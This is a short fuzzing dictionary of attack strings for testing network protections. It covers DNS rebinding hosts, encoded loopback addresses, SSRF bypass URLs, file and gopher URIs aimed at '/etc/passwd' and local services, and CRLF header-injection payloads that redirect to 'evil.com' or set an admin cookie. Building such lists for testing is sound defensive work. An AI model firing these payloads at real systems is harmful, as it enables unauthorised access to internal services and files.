# Network Security Attack Dictionary
# Vectors for testing network security boundaries and protections

# DNS Rebinding Attacks
"127.0.0.1"
"localhost"
"::1"
"0.0.0.0"
"192.168.1.1"
"10.0.0.1"
"172.16.0.1"
"169.254.1.1"
"224.0.0.1"
"255.255.255.255"

# IP Address Encoding Variants
"2130706433"
"017700000001"
"0x7f000001"
"0177.0000.0000.0001"
"127.000.000.001"
"127.1"
"127.0.1"

# DNS Manipulation
"evil.com.127.0.0.1.xip.io"
"127.0.0.1.evil.com"
"evil.127.0.0.1.nip.io"
"localhost.evil.com"
"[::1].evil.com"

# SSRF Bypass Techniques
"http://example.com@127.0.0.1/"
"http://127.0.0.1#example.com"
"http://127.0.0.1?example.com"
"http://127.0.0.1/example.com"
"http://127.0.0.1:80@example.com/"
"http://evil.com/redirect?url=http://127.0.0.1"

# Protocol Confusion
"file:///"
"file:///etc/passwd"
"file:///etc/hosts"
"file:///proc/version"
"file:///dev/random"
"ftp://127.0.0.1/"
"gopher://127.0.0.1/"
"dict://127.0.0.1:11211/"
"ldap://127.0.0.1/"

# HTTP Header Injection
"\\r\\n"
"\\r\\nX-Injected: header"
"\\r\\nLocation: http://evil.com"
"\\r\\nSet-Cookie: admin=true"
"\\r\\nHost: evil.com"
"\\r\\nContent-Length: 0\\r\\n\\r\\nGET /admin"

